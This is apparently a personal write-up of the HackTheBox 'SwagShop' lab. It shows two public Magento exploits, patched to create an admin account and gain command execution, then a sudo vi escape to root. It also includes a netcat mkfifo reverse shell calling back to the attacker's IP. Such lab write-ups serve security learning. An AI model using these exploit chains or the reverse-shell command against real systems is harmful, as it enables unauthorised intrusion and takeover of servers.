This article is a writeup about a retired HacktheBox machine:
[Swagshop](https://www.hackthebox.com/home/machines/profile/188)
This box was suppose to be an easy one. Turns out it wasn't. I struggle a lot in
wrong direction and finally found a path to root this magento box.

This article presents the different methods which failed on the box as well as
the solution to root it.

## Web

As there is only an SSH and a HTTP port, we continue our recon on the web part.

When accessing the website we can observe a Magento website.

Let us try a dirb:

We see that there is a lot of directories accessible directly.
We can gather a lot of information from them, for instance the release notes
gives us some information by the version of the application:

An admin panel is also accessible on the application:

Let us see what CVE are available for magento. Our version is 1.7.0.2.

    Shellcodes: No Result

Our application is vulnerable to two interesting exploit:

  * Magento eCommerce - Remote Code Execution (exploits/xml/webapps/37977.py)
  * Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution (exploits/php/webapps/37811.py)

## Getting Admin

The second exploit allow to create an admin account on the application.

But the exploit's script use a wrong URL. We add "/index.php/admin/" to the
target URL:

    :::python
    target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/" 

This will create an administrator account named "forme" with the same password.
We can then login to the admin panel and access the full magento framework.

![magenta admin panel](/media/2019.09/swagshop_1.png){: .image-process-article-image}

## The RCE way

### To the user flag

From there a few possibility will allow us to execute code on the application:

The first one is to upload a magento extension using the download. A blog
post from jvoisin explain how to write this "simple" backdoor:
[Writing a simple extension/backdoor for Magento](https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html).
Nevertheless, the downloader is disabled a return a 404 error.

The second one implies to create a new product and exploit a phtml page to
execute code on the server. An article blog describe the process
[Sec Team Blog](https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/).
Once more this method does not seems to work. Maybe our Magenton version is too
old an the vulnerability is not introduce on the application yet.

An other on is to exploit the "froghopper" attack described in a
[forgenix blog post](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper).
Again, the uploaded code was not executed on the server

The last option is to use the other exploit that was listed with searchsploit:
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution (exploits/php/webapps/37811.py)

We change the install\_date parameter and we add our credentials to the script.

    :::python
    install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml


Then we launch the script:

    :::bash
    python sploi.py http://10.10.10.140/index.php/admin "uname -a"
    Traceback (most recent call last):
      File "37811.py", line 69, in <module>
        tunnel = tunnel.group(1)
        AttributeError: 'NoneType' object has no attribute 'group'


The error is because in the last 7 days there were no sales. We can change
this parameter in the exploit code (we put 2 years to be safe):

    :::python
    #request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
    request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)
    tunnel = re.search("src=\"(.*)\?ga=", request.read())
    tunnel = tunnel.group(1)

We relaunch the script:

    :::bash
    python sploi.py http://10.10.10.140/index.php/admin "uname -a"
    Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
    python sploi.py http://10.10.10.140/index.php/admin "whoami"
    www-data

We get a remote code execution. From there we can get a reverse shell or do
everything only with the RCE. I struggle a bit with the reverse shell before
finding the right one. Therefore I will start with the RCE only exploitation.


As the box is often reset by other players we chain the two exploit in a bash
script.

    :::bash
    python 37977.py
    python sploi.py http://10.10.10.140/index.php/admin "whoami"

_Fron now on I will only write the command of the second script ("whoami" in the
exemple above) and make more than one command by duplicating the line._

We want to get the user flag. In HTB's VM there is always a user flag in
/home/<some user>/user.txt and a root flag in /root/root.txt (at least on the
Linux One). So we look at the user directory:

    :::text
    ls /home/
    haris

We list the user folder:

    :::text
    ls /home/haris/
    user.txt

And we get the user flag:

    :::text
    cat /home/haris/user.txt
    a4488<redacted>

### let's get root

We start by enumerating our permissions on the box:

    :::text
    sudo -l
    Matching Defaults entries for www-data on swagshop:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on swagshop:
        (root) NOPASSWD: /usr/bin/vi /var/www/html/*

It is well known that Vi let you run system command. Nevertheless we must execute
this command without a shell. For that we can use the vi "-c" option:

    :::text
    python sploi.py http://10.10.10.140/index.php/admin "sudo /usr/bin/vi /var/www/html/1 -c ':! cat /root/root.txt > /tmp/mak/6'"
    python sploi.py http://10.10.10.140/index.php/admin "cat /tmp/mak/6"
    c2b087<redacted>

        |   |.  |
        |   |.  |         Join the beta HTB Swag Store!
        |___|.__|       https://hackthebox.store/password

                                  PS: Use root flag as password!


## Reverse shell way

There is another way to resolve this part of the box: using a reverse shell!

My classic python reverse shell was not working as there was no python on the box and
the bash reverse was also not working. Nevertheless, the netcat one was working:

    :::bash
    python sploi.py http://10.10.10.140/index.php/admin "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.148 1234 >/tmp/f"

On the client side we need to open a listener with netcat:

    :::bash
    netcat -lvp 1234

Then we got a reverse shell!

With this reverse shell the commands are the same but faster ;).
We can easily find the user flag:

    :::text
    ls /home/
    haris
    ls /home/haris/
    user.txt
    cat /home/haris/user.txt
    a44887<redacted>

For the privilege escalation we can just spwan a vi:

    :::text
    $ sudo -l
    Matching Defaults entries for www-data on swagshop:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on swagshop:
        (root) NOPASSWD: /usr/bin/vi /var/www/html/*
    $ sudo /usr/bin/vi /var/www/html/1

We get an error about the terminal not being interactive:

    :::text
    Vim: Warning: Output is not to a terminal
    Vim: Warning: Input is not from a terminal

Then we just enter the command to get a shell from vi:

    :::text
    :! /bin/bash
    id
    uid=0(root) gid=0(root) groups=0(root)
    ls /root/
    root.txt
    cat /root/root.txt
    c2b087<redacted>


# Wrapping up

This box was really interesting. I learned a lot about magento admin panel. As
the downloader was disabled, the easiest way to execute code on the box was not
available and I had to find other ways to execute code on a magento website from
the admin panel. This might became handy someday.
The privilege escalation was quit easy as I know a lot about vi.
